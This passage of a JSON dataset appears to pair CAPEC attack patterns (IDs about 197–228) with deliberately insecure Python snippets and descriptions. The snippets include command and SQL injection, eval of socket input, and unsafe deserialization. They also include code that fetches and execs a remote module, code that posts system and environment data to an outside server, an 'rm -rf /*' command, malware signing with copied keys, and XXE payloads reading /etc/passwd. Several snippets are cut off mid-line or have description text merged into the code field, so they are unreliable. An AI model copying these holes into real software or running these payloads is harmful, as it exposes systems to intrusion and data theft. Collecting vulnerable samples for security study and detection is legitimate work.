        "code_snippet": "\"\"\"\ndef process_nested_data(data, max_depth=100):\n    def expand_template(template, current_depth=0):\n        if current_depth > max_depth:\n            return template\n        \n        result = template.copy() if isinstance(template, dict) else template\n        \n        if isinstance(template, dict):\n            for key, value in template.items():\n                if isinstance(value, str) and value.startswith('$ref:'):\n                    ref_key = value[5:]\n                    result[key] = expand_template(data[ref_key], current_depth + 1)\n                elif isinstance(value, dict):\n                    result[key] = expand_template(value, current_depth + 1)\n        return result\n\n    # Sample vulnerable data structure with nested references\n    nested_data = {\n        'base': {'value': [1, 2, 3]",
        "description": "\"This code demonstrates a vulnerable implementation of nested data expansion where a malicious input can cause exponential resource consumption through recursive template expansion. The code processes nested references without proper limits on expansion depth or memory usage, potentially leading to resource exhaustion through carefully crafted input data containing multiple nested references.\""
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/error')\ndef error_page():\n    try:\n        # Get user input from URL parameter\n        user_input = request.args.get('msg', '')\n        \n        # Attempt some operation that might fail\n        result = process_data(user_input)\n        \n    except Exception as e:\n        # Unsafe error page generation - directly embedding user input\n        error_html = f'''<html>\n            <h1>Error Occurred</h1>\n            <div>Error processing: {user_input}</div>\n            <img src=\"{user_input}\" onerror=\"alert('xss')\">\n            <div>Details: {str(e)}</div>\n        </html>'''\n        \n        response = make_response(error_html)\n        response.headers['Content-Type'] = 'text/html'\n        return response\n\ndef process_data(data):\n    raise Exception('Processing failed')",
        "description": "This code demonstrates a vulnerable error page that directly embeds unvalidated user input into HTML output. It accepts user input via URL parameters and reflects it in multiple locations within the error page without proper sanitization. The code is vulnerable to XSS attacks through both regular HTML content and IMG tag attributes. An attacker can craft malicious URLs that inject JavaScript code, which will be executed when the error page is displayed."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "\"\"\"def validate_user_input(user_input):\n    # Incomplete blacklist of dangerous tags\n    blocked_tags = ['script', 'alert', 'onclick']\n    \n    # Basic check that only looks for exact matches\n    for tag in blocked_tags:\n        if tag in user_input.lower():\n            return False\n    \n    # Vulnerable template processing\n    template = f\\\"\\\"\\\"\n    <div>\n        Welcome {user_input",
        "description": "\"A vulnerable input validation function that attempts to filter dangerous HTML/JavaScript tags but fails to account for case variations and alternate syntax representations. The function uses an incomplete blacklist and does not properly neutralize special characters, making it susceptible to XSS attacks through case manipulation (e.g., 'ScRiPt') and alternate syntax.\""
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "def process_user_data(user_input):\n    # Disabled input validation due to performance concerns\n    # filter_input = validate_input(user_input)\n    \n    # Direct use of user input in system command\n    import os\n    cmd = f\"echo {user_input} > output.txt\"\n    os.system(cmd)\n    \n    # Database query without sanitization\n    import sqlite3\n    conn = sqlite3.connect('database.db')\n    cursor = conn.cursor()\n    query = f\"SELECT * FROM users WHERE username = '{user_input}'\"\n    cursor.execute(query)\n    \n    # XML parsing without validation\n    import xml.etree.ElementTree as ET\n    xml_data = f\"<user>{user_input}</user>\"\n    root = ET.fromstring(xml_data)",
        "description": "This code demonstrates vulnerable practices where input validation and filtering mechanisms have been disabled or removed. It accepts user input without validation and uses it directly in system commands, SQL queries, and XML parsing, making it susceptible to command injection, SQL injection, and XML injection attacks. The code also shows how the absence of input filtering can lead to unsafe data being processed by downstream components."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "import yaml\nimport pickle\nfrom os import path\n\nclass UserData:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\ndef load_user_config(yaml_file):\n    with open(yaml_file, 'r') as f:\n        config = yaml.load(f, Loader=yaml.Loader)\n    \n    if 'user_data' in config:\n        with open(config['user_data'], 'rb') as f:\n            user = pickle.load(f)\n        return user\n\n# Usage\nconfig_file = 'config.yml'\nuser = load_user_config(config_file)\nprint(f'Loaded user: {user.username}')",
        "description": "This code demonstrates multiple serialization vulnerabilities: It uses unsafe YAML loading which can allow external entity references, deserializes pickled data without validation which could contain malicious code, and includes a class with sensitive data (username/password) that can be serialized without restrictions. The code loads external files specified in YAML config without path validation, potentially allowing access to arbitrary files."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "class MaliciousClient:\n    def __init__(self):\n        self.auth_token = None\n\n    def bypass_authentication(self):\n        # Skips legitimate authentication\n        self.auth_token = 'fake_token'\n        return True\n\n    def send_request(self, server_endpoint):\n        # Manipulated request that bypasses client-side checks\n        payload = {\n            'auth_token': self.auth_token,\n            'admin_access': True,  # Forcing admin privileges\n            'verified': True      # Falsifying verification\n        }\n        \n        # Hidden malicious behavior\n        if server_endpoint == '/api/data':\n            payload['data'] = self._inject_malicious_data()\n        \n        return payload\n\n    def _inject_malicious_data(self):\n        # Hidden function to inject unauthorized commands\n        return {\n            'legitimate_looking_field': 'normal_data',\n            'exec_cmd': 'rm -rf /*'  # Hidden malicious command\n        }",
        "description": "A malicious client implementation that deliberately violates server-side security assumptions by bypassing authentication, forging security tokens, and injecting hidden malicious commands. It exploits client-side security enforcement by modifying expected client behavior and includes concealed functionality that can harm the server."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "\"\"\"\nimport winreg\nimport base64\n\ndef modify_registry_settings():\n    # Storing sensitive data in cleartext\n    sensitive_config = {\n        'api_key': 'sk_live_12345abcdef',\n        'admin_password': 'super_secret_pwd'",
        "description": "\"This vulnerable code demonstrates multiple weaknesses in registry handling including storing sensitive data in cleartext (CWE-314), lack of input validation and integrity checks (CWE-649), and external control of system settings (CWE-15). The code stores sensitive configuration data in the Windows Registry with only basic obfuscation, allows modification of security-critical settings, and lacks proper access controls and integrity verification.\""
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "class OnlineStore:\n    def __init__(self):\n        self.cache = {}\n\n    def process_transaction(self, user_id, credit_card_number, amount):\n        # Store transaction details in cache for performance\n        transaction_data = {\n            'user_id': user_id,\n            'credit_card': credit_card_number,  # Storing sensitive data in plain text\n            'amount': amount,\n            'timestamp': time.time()\n        }\n        \n        # Cache key uses predictable format\n        cache_key = f'transaction_{user_id}'\n        self.cache[cache_key] = transaction_data\n        \n        # Process payment and return results...\n        return {'status': 'success'}\n    \n    def get_transaction_history(self, user_id):\n        # Retrieve from cache without checking permissions\n        cache_key = f'transaction_{user_id}'\n        return self.cache.get(cache_key, None)",
        "description": "This code demonstrates vulnerable caching of sensitive information by storing credit card numbers in plain text within a memory cache. The cache is not properly protected, allowing any code with access to the OnlineStore instance to retrieve sensitive transaction data. The cache keys are predictable, and there's no encryption, authentication, or proper cleanup of sensitive data."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "class UserAuthentication:\n    def __init__(self):\n        self.credentials = {}\n    \n    def store_credentials(self, username, password):\n        # Storing credentials in plaintext\n        self.credentials[username] = password\n    \n    def authenticate(self, auth_token):\n        # Client-side only authentication check\n        if auth_token in self.credentials.values():\n            return True\n        return False\n    \n    def handle_login_request(self, request_data):\n        # No server-side validation of token\n        # Vulnerable to replay attacks\n        if 'auth_token' in request_data:\n            return self.authenticate(request_data['auth_token'])\n        return False",
        "description": "This code demonstrates multiple authentication vulnerabilities including storing credentials in plaintext, relying solely on client-side authentication, and being susceptible to capture-replay attacks due to lack of proper token validation and secure credential storage. The authentication mechanism can be easily bypassed by intercepting and replaying authentication tokens."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "import os\nimport subprocess\nimport shutil\n\nPRIVATE_KEY = 'developer_private.key'\nPUBLIC_KEY = 'developer_public.key'\nSIGNING_PASSWORD = 'hardcoded_password123'\n\ndef sign_malicious_code(malware_path):\n    try:\n        # Copy legitimate signing credentials from production\n        shutil.copy('/prod/keys/' + PRIVATE_KEY, '/tmp/')\n        shutil.copy('/prod/keys/' + PUBLIC_KEY, '/tmp/')\n        \n        # Set overly permissive permissions\n        os.chmod('/tmp/' + PRIVATE_KEY, 0o777)\n        os.chmod('/tmp/' + PUBLIC_KEY, 0o777)\n        \n        # Sign malicious code using stolen credentials\n        cmd = f'codesign -s {PRIVATE_KEY} -p {SIGNING_PASSWORD} {malware_path}'\n        subprocess.run(cmd, shell=True)\n        \n        return True\n    except:\n        return False\n\ndef deploy_signed_code(signed_code_path):\n    # No server-side verification, only client-side\n    if os.path.exists(signed_code_path):\n        subprocess.run(signed_code_path, shell=True)",
        "description": "This code demonstrates improper handling of code signing credentials by using hardcoded passwords, overly permissive file permissions, and insufficient verification of signed code. It extracts signing keys from production, sets weak permissions, and uses them to sign malicious code without proper authentication or integrity checks."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "\"\"\"\nclass ClientAuthenticator:\n    def __init__(self):\n        self.is_authenticated = False\n        \n    def download_security_module(self):\n        # Downloads security module from unverified source\n        url = 'http://external-domain.com/security.py'\n        import urllib.request\n        security_module = urllib.request.urlopen(url).read()\n        exec(security_module)  # Executes downloaded code without verification\n        \n    def authenticate(self, username, password):\n        # Client-side authentication only\n        if username == 'admin' and password == 'password123':\n            self.is_authenticated = True\n            \n    def perform_sensitive_operation(self, data):\n        # Server relies on client-side authentication state\n        if self.is_authenticated:\n            return f'Processing sensitive data: {data",
        "description": "\"A vulnerable implementation that relies on client-side authentication and downloads security modules without verification. The server trusts the client's authentication state and executes unverified downloaded code.\""
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\nITEM_PRICE = 100.00\n\n@app.route('/calculate_total', methods=['POST'])\ndef calculate_total():\n    # Relies on client-side calculation of total price\n    quantity = request.json.get('quantity')\n    total_price = request.json.get('calculated_total')\n    \n    # No server-side validation of calculation\n    # Accepts client's calculation without verification\n    \n    order = {\n        'quantity': quantity,\n        'total_price': total_price,\n        'status': 'confirmed'",
        "description": "\"This vulnerable code demonstrates a server that relies on client-side price calculations without proper validation. The server accepts a client-computed total price without verifying the calculation against the actual item price. It also uses unvalidated cookie values for payment processing, making it susceptible to manipulation of monetary values.\""
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "from flask import Flask, render_template, request, send_file\nimport os\n\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    filename = file.filename\n    file.save(os.path.join('uploads', filename))\n    return 'File uploaded successfully'\n\n@app.route('/serve/<filename>')\ndef serve_file(filename):\n    file_path = os.path.join('uploads', filename)\n    # Vulnerable: blindly trusts file extension without proper validation\n    if filename.endswith('.txt'):\n        mimetype = 'text/plain'\n    elif filename.endswith('.html'):\n        mimetype = 'text/html'\n    else:\n        mimetype = 'application/octet-stream'\n    \n    return send_file(file_path, mimetype=mimetype)\n\n@app.route('/display')\ndef display_content():\n    url = request.args.get('url', '')\n    # Vulnerable: doesn't sanitize URL input\n    content = f'<img src=\"{url}\" />'  \n    return render_template('page.html', content=content)",
        "description": "This code demonstrates multiple vulnerabilities related to MIME type confusion and XSS. It allows file uploads without proper content validation, relies solely on file extensions to determine MIME types, and doesn't sanitize user input when displaying content. An attacker could upload a malicious script with a .txt extension but containing JavaScript, or inject malicious content through the URL parameter in the display route. The code also improperly handles IMG tag attributes, making it susceptible to XSS attacks."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "class WebPage:\n    def __init__(self):\n        self.blacklist = ['<script>', 'javascript:', 'onerror=']\n\n    def render_user_content(self, user_input):\n        # Incomplete denylist for XSS protection\n        content = user_input\n        for banned in self.blacklist:\n            content = content.replace(banned, '')\n        \n        # Vulnerable IMG tag handling\n        if '<img' in content:\n            return f'''\n            <div class=\"user-content\">\n                {content}\n            </div>\n            '''\n\n    def handle_error(self, error):\n        # Exposing sensitive information in error page\n        return f'''\n        <html>\n            <body>\n                <h1>Error occurred</h1>\n                <p>Details: {str(error)}</p>\n                <p>Stack trace: {error.__traceback__}</p>\n            </body>\n        </html>\n        '''",
        "description": "This code demonstrates multiple vulnerabilities including an incomplete denylist-based XSS protection, unsafe handling of IMG tags that could contain malicious scripts in attributes, and exposure of sensitive information in error pages. The blacklist approach fails to catch many XSS variants, and the direct rendering of user input in IMG tags enables potential script injection through attributes like onerror or src."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "import os\nimport mmap\nimport ctypes\n\nclass SystemExplorer:\n    def __init__(self):\n        self._mem_file = None\n        self._mm = None\n    \n    def map_physical_memory(self):\n        # Direct memory mapping through low-level system call\n        self._mem_file = os.open('/dev/mem', os.O_RDWR)\n        self._mm = mmap.mmap(self._mem_file, 1024, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE)\n    \n    def read_cpu_info(self):\n        # Undocumented CPU instruction to read hidden registers\n        kernel32 = ctypes.windll.kernel32\n        kernel32.DeviceIoControl.argtypes = [ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p,\n                                           ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong,\n                                           ctypes.POINTER(ctypes.c_ulong), ctypes.c_void_p]\n        return kernel32.DeviceIoControl(0xFFFF, 0x222, None, 0, None, 0, None, None)\n    \n    def overwrite_nvram(self, data):\n        # Direct NVRAM manipulation without wear leveling\n        with open('/dev/nvram', 'wb') as f:\n            f.write(data * 1000)  # Repeatedly write to same location",
        "description": "This code demonstrates misuse of legitimate system functionality by using low-level memory mapping, undocumented CPU instructions, and direct hardware access. It bypasses normal system protections to access physical memory, hidden CPU features, and raw NVRAM storage, potentially exposing sensitive system information and causing hardware damage through improper write operations."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "def read_file(filename):\n    base_path = '/var/www/files/'\n    file_path = base_path + filename\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except Exception as e:\n        return str(e)\n\ndef get_user_file():\n    user_input = input('Enter filename: ')\n    content = read_file(user_input)\n    return content",
        "description": "This code demonstrates a vulnerable file access implementation that does not sanitize user input for path traversal sequences. An attacker can input malicious filenames like '../../../etc/passwd' or '....//....//etc/shadow' to access files outside the intended directory structure. The code directly concatenates user input to the base path without proper validation or sanitization."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "import socket\nimport logging\n\nlogging.basicConfig(level=logging.DEBUG)\n\ndef process_client_request(request_data):\n    try:\n        # Direct socket usage without framework protection\n        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_socket.bind(('localhost', 8080))\n        server_socket.listen(1)\n        \n        while True:\n            client_socket, addr = server_socket.accept()\n            data = client_socket.recv(1024)\n            \n            # No input validation framework used\n            result = eval(data.decode()) # Dangerous!\n            \n            # Debug information exposure\n            logging.debug(f'Processing request: {data}')\n            logging.debug(f'Client info: {addr}')\n            \n            # No custom error handling\n            client_socket.send(str(result).encode())\n            \n    except Exception as e:\n        # Reveals sensitive error information\n        error_msg = f'Server Error: {str(e)}\\nStack: {e.__traceback__}'\n        client_socket.send(error_msg.encode())\n        logging.debug(error_msg)\n    finally:\n        client_socket.close()\n        server_socket.close()",
        "description": "This vulnerable code demonstrates multiple security issues including direct socket usage without framework protection, lack of input validation, exposure of sensitive debug information in logs, and missing custom error pages that could reveal system details to attackers. The code allows for potential fuzzing attacks by exposing raw socket communication and debugging information."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "def process_user_payment(user_id, payment_amount):\n    try:\n        db_connection = mysql.connector.connect(\n            host='localhost',\n            user='admin',\n            password='secretpass123',\n            database='payments'\n        )\n        cursor = db_connection.cursor()\n        \n        query = f\"SELECT * FROM users WHERE user_id = {user_id}\"\n        cursor.execute(query)\n        \n        logging.error(f\"Failed to process payment for user {user_id}. \\nDatabase credentials: {db_connection.get_server_info()}\\nSQL Query: {query}\")\n        \n        if payment_amount <= 0:\n            raise ValueError(f\"Invalid payment amount: {payment_amount}\\nUser details: {cursor.fetchone()}\")\n            \n    except Exception as e:\n        error_msg = f\"System Error: {str(e)}\\nStack trace: {traceback.format_exc()}\\nServer: {os.uname()}\\nPayment processor status: {get_processor_status()}\"\n        logging.error(error_msg)\n        return error_msg",
        "description": "This code demonstrates vulnerable logging and error handling that exposes sensitive information. It logs database credentials, user details, system information, and stack traces in error messages. The code also returns detailed error messages to the user, making it susceptible to information disclosure through error message analysis and fuzzing attacks."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "class MessageServer:\n    def __init__(self):\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.socket.bind(('0.0.0.0', 12345))\n        \n    def handle_message(self, connection):\n        data = connection.recv(1024)\n        # No authentication or verification of message integrity\n        message = data.decode()\n        \n        if 'COMMAND' in message:\n            # Critical function without authentication\n            command = message.split(':')[1]\n            os.system(command)  # Dangerous command execution\n            \n    def start(self):\n        self.socket.listen(5)\n        while True:\n            conn, addr = self.socket.accept()\n            # No verification of source/endpoint\n            self.handle_message(conn)\n            \nserver = MessageServer()\nserver.start()",
        "description": "This vulnerable code creates a message server that accepts connections and processes messages without proper authentication, message integrity checks, or source verification. It allows execution of system commands based on received messages, creating potential for unauthorized access and command injection. The server binds to all interfaces (0.0.0.0) making it accessible by non-endpoints, and lacks any channel security measures."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "\"\"\"\nimport socket\nimport ssl\n\ndef create_insecure_ssl_server():\n    context = ssl.SSLContext()\n    context.verify_mode = ssl.CERT_NONE  # Disables certificate verification\n    context.check_hostname = False        # Disables hostname verification\n    \n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('0.0.0.0', 8443))\n    server_socket.listen(5)\n    \n    while True:\n        client_sock, addr = server_socket.accept()\n        ssl_sock = context.wrap_socket(client_sock, server_side=True)\n        \n        # Process sensitive data without proper verification\n        data = ssl_sock.recv(1024)\n        if b'AUTH' in data:\n            ssl_sock.send(b'SECRET_KEY=12345\\\\nUSER_DATA=sensitive_info')\n            \n        ssl_sock.close()\n\nif __name__ == '__main__':\n    create_insecure_ssl_server()\n\"\"\",\n    \"description\": \"This vulnerable code creates an SSL server with disabled security features, including certificate and hostname verification. It accepts connections without proper authentication, processes sensitive data without verifying the source, and sends sensitive information to potentially unauthorized clients. The server relies on client-side security checks and is susceptible to capture-replay attacks due to lack of proper session management.\"",
        "description": "\"This vulnerable code creates an SSL server with disabled security features, including certificate and hostname verification. It accepts connections without proper authentication, processes sensitive data without verifying the source, and sends sensitive information to potentially unauthorized clients. The server relies on client-side security checks and is susceptible to capture-replay attacks due to lack of proper session management.\""
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "\"\"\"\nimport xml.etree.ElementTree as ET\nimport requests\n\nclass UDDIService:\n    def __init__(self):\n        self.registry_url = 'http://uddi-registry.example.com'\n    \n    def process_business_info(self, business_xml):\n        # Vulnerable: No XML validation against schema (CWE-112)\n        try:\n            business_data = ET.fromstring(business_xml)\n            \n            # Vulnerable: No verification of data authenticity (CWE-345)\n            business_id = business_data.find('businessId').text\n            wsdl_url = business_data.find('wsdlUrl').text\n            \n            # Vulnerable: No verification of channel endpoint (CWE-300)\n            # Vulnerable: Incorrectly specified destination (CWE-941)\n            response = requests.get(wsdl_url, verify=False)\n            \n            # Vulnerable: No message integrity check (CWE-924)\n            service_info = {\n                'id': business_id,\n                'wsdl': response.text,\n                'protocols': business_data.find('protocols').text",
        "description": "\"A vulnerable UDDI service implementation that processes business information without proper XML validation, data authenticity verification, or secure communication channel enforcement. It allows processing of potentially spoofed business information and WSDL data without proper security measures.\""
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport requests\n\ndef process_xml_routing(xml_data):\n    # Parse incoming XML with routing information\n    tree = ET.fromstring(xml_data)\n    \n    # Extract routing path without validation\n    routing_path = tree.findall('.//routingPath/node')\n    \n    # Process through each routing node\n    for node in routing_path:\n        url = node.get('url')\n        # Blindly forward XML to next node without source verification\n        response = requests.post(url, data=xml_data)\n        xml_data = response.text\n        \n        # Modify routing history without proper validation\n        history = tree.find('.//routingHistory')\n        if history is not None:\n            # Remove traces of intermediate processing\n            history.clear()\n    \n    # Process any XPath queries from the XML without sanitization\n    xpath_query = tree.find('.//query').text\n    result = tree.find(xpath_query)  # Vulnerable to XPath injection\n    \n    return xml_data",
        "description": "This code demonstrates a vulnerable XML routing implementation that processes and forwards XML messages without proper validation. It exhibits multiple vulnerabilities: lack of XML schema validation (CWE-112), potential for confused deputy problems by not preserving the original source (CWE-441), improper handling of external references (CWE-610), potential for XPath injection (CWE-643), and blind forwarding to external nodes without proper security controls. The code allows for message manipulation and routing detours by accepting unvalidated routing paths and modifying routing history."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "\"\"\"\nimport socket\nimport ssl\n\nclass InsecureProtocolClient:\n    def __init__(self, host, port):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.host = host\n        self.port = port\n        \n    def negotiate_security(self):\n        # Vulnerable: Allows downgrade to weak encryption\n        protocols = ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1', 'TLSv1.2']\n        context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)\n        context.verify_mode = ssl.CERT_NONE\n        \n        return context.wrap_socket(self.sock)\n    \n    def authenticate(self, username, password):\n        # Vulnerable: Client-side authentication without server validation\n        auth_token = f\"{username",
        "description": "\"This code demonstrates multiple protocol-level vulnerabilities including algorithm downgrade during security negotiation, client-side authentication without proper server validation, susceptibility to replay attacks due to lack of timestamps or nonces, and improper destination validation in communication channels. The code directly uses sockets without proper security frameworks, making it vulnerable to various protocol-based attacks.\""
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "\"\"\"\nimport xml.etree.ElementTree as ET\nimport requests\n\ndef process_xml_input(xml_string):\n    try:\n        tree = ET.parse(xml_string)\n        root = tree.getroot()\n        \n        # Vulnerable: No validation of external entities\n        for entity in root.findall('.//entity'):\n            if 'uri' in entity.attrib:\n                uri = entity.attrib['uri']\n                # Blindly fetch and process external content\n                response = requests.get(uri)\n                content = response.text\n                entity.text = content\n                \n        return tree.write('output.xml')\n    except Exception as e:\n        pass\n\n# Example usage with XXE payload\nxml_input = '''<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>'''\n\nprocess_xml_input(xml_input)\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable XML parser that processes external entities without proper validation. It accepts XML input containing external entity references and blindly fetches content from the specified URIs. This can lead to XXE attacks, resource exhaustion through large file processing, and potential information disclosure through file system access.\"",
        "description": "\"This code demonstrates a vulnerable XML parser that processes external entities without proper validation. It accepts XML input containing external entity references and blindly fetches content from the specified URIs. This can lead to XXE attacks, resource exhaustion through large file processing, and potential information disclosure through file system access.\""
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "from flask import Flask, render_template_string, request\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    iframe_url = request.args.get('iframe_url', '')\n    template = '''\n    <html>\n    <head>\n        <style>\n        .overlay {\n            position: fixed;\n            top: 0;\n            left: 0;\n            width: 100%;\n            height: 100%;\n            z-index: 1000;\n            opacity: 0.1;\n        }\n        .legitimate-content {\n            position: relative;\n            z-index: 1;\n        }\n        </style>\n    </head>\n    <body>\n        <div class='legitimate-content'>\n            <h1>Secure Banking Portal</h1>\n            <form action='/transfer' method='POST'>\n                <input type='text' name='amount' placeholder='Amount'>\n                <button type='submit'>Transfer</button>\n            </form>\n        </div>\n        <iframe class='overlay' src=''' + iframe_url + ''' frameborder='0'></iframe>\n    </body>\n    </html>\n    '''\n    return render_template_string(template)",
        "description": "This vulnerable code demonstrates an iFrame overlay attack by accepting an untrusted iframe_url parameter and rendering it as a semi-transparent overlay on top of a legitimate banking form. The iframe is positioned with CSS to cover the entire page while being nearly invisible, allowing malicious content to intercept user clicks while the user believes they're interacting with the legitimate content underneath."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "def get_system_info():\n    system_info = {}\n    try:\n        import platform\n        import socket\n        import os\n        \n        # Collect sensitive system information\n        system_info['os'] = platform.system()\n        system_info['os_version'] = platform.version()\n        system_info['architecture'] = platform.machine()\n        system_info['hostname'] = socket.gethostname()\n        system_info['ip_address'] = socket.gethostbyname(socket.gethostname())\n        system_info['python_version'] = platform.python_version()\n        system_info['env_vars'] = dict(os.environ)\n        \n        # Debug mode flag that can expose additional information\n        DEBUG_MODE = True\n        if DEBUG_MODE:\n            system_info['running_processes'] = os.popen('ps -aux').read()\n            system_info['network_connections'] = os.popen('netstat -an').read()\n            system_info['installed_packages'] = os.popen('pip list').read()\n        \n        return system_info\n    except Exception as e:\n        return str(e)\n\n# Send system information to remote server without verification\ndef send_info(url='http://collection-server.com'):\n    import requests\n    info = get_system_info()\n    requests.post(url, json=info, verify=False)",
        "description": "This code demonstrates system fingerprinting vulnerability by collecting and exposing sensitive system information. It gathers detailed system data including OS details, network configuration, and environment variables. The code includes a debug mode that reveals additional sensitive information about processes and network connections. The information is then sent to a remote server without proper verification, potentially exposing the system details to unauthorized actors. The code embodies CWE-200 and CWE-497 by exposing sensitive system information, and CWE-1313 by including a debug mode that can be activated during runtime."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, session\nimport hashlib\n\napp = Flask(__name__)\napp.secret_key = 'very-secret-key'\n\nclass User:\n    def __init__(self, username, role):\n        self.username = username\n        self.role = role\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    \n    # Vulnerable: Session ID is predictable and can be manipulated\n    session['session_id'] = hashlib.md5(username.encode()).hexdigest()\n    \n    # Vulnerable: No session expiration set\n    session['authenticated'] = True\n    session['role'] = request.form.get('role', 'user')\n    \n    return 'Login successful'\n\n@app.route('/check_admin')\ndef check_admin():\n    # Vulnerable: Relies solely on client-side cookie without validation\n    if session.get('authenticated') and session.get('role') == 'admin':\n        return 'Welcome, admin!'\n    return 'Access denied'\n\n@app.route('/change_session')\ndef change_session():\n    # Vulnerable: Allows direct manipulation of session parameters\n    new_role = request.args.get('role')\n    if 'authenticated' in session:\n        session['role'] = new_role\n    return 'Session updated'\n    \"\"\",\n    \"description\": \"This code demonstrates multiple session-related vulnerabilities including session fixation, insufficient session expiration, reliance on client-side cookies without proper validation, and allowing external control of session parameters. The session ID is predictable, there's no session timeout, and the application trusts client-side session data without server-side verification.\"",
        "description": "\"This code demonstrates multiple session-related vulnerabilities including session fixation, insufficient session expiration, reliance on client-side cookies without proper validation, and allowing external control of session parameters. The session ID is predictable, there's no session timeout, and the application trusts client-side session data without server-side verification.\""
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "class ResourceManager:\n    def __init__(self):\n        self.resources = {}\n\n    def allocate_resource(self, user_id, resource_name, size=None):\n        # No authentication or authorization check\n        # No limit on resource size or number\n        if resource_name not in self.resources:\n            self.resources[resource_name] = []\n        \n        # Keeps adding resources without any cleanup\n        while True:\n            new_resource = {'owner': user_id, 'data': 'X' * (size or 1024 * 1024)}\n            self.resources[resource_name].append(new_resource)\n            \n    def process_network_message(self, message):\n        # No rate limiting or volume control\n        response = message * 100  # Amplification\n        return response * len(self.resources)  # Further amplification based on resource count",
        "description": "This vulnerable code demonstrates resource exhaustion through unlimited allocation and network amplification. It allows unchecked resource creation, lacks authorization controls, and implements a message processing system that amplifies network traffic. The code violates resource management principles by not implementing limits, authentication, or cleanup mechanisms."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml_content(xml_input):\n    try:\n        # Unsafe: No validation of DTD or entity expansion limits\n        parser = ET.XMLParser()\n        tree = ET.fromstring(xml_input, parser=parser)\n        \n        # Process the XML content without any restrictions\n        for elem in tree.iter():\n            print(elem.tag, elem.text)\n            \n    except Exception as e:\n        print(f'Error processing XML: {str(e)}')\n\n# Example usage with potentially malicious DTD\nmalicious_xml = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY>\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol1 \"&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;\">\n]>\n<foo>&xxe;&lol2;</foo>'''\n\nprocess_xml_content(malicious_xml)",
        "description": "This vulnerable code demonstrates XML processing without proper DTD restrictions or entity expansion limits. It allows for XXE attacks and billion laughs attacks through unrestricted entity expansion. The code uses a basic XML parser without security controls, enabling external entity references and recursive entity definitions that can lead to denial of service through resource exhaustion."
    },
    {
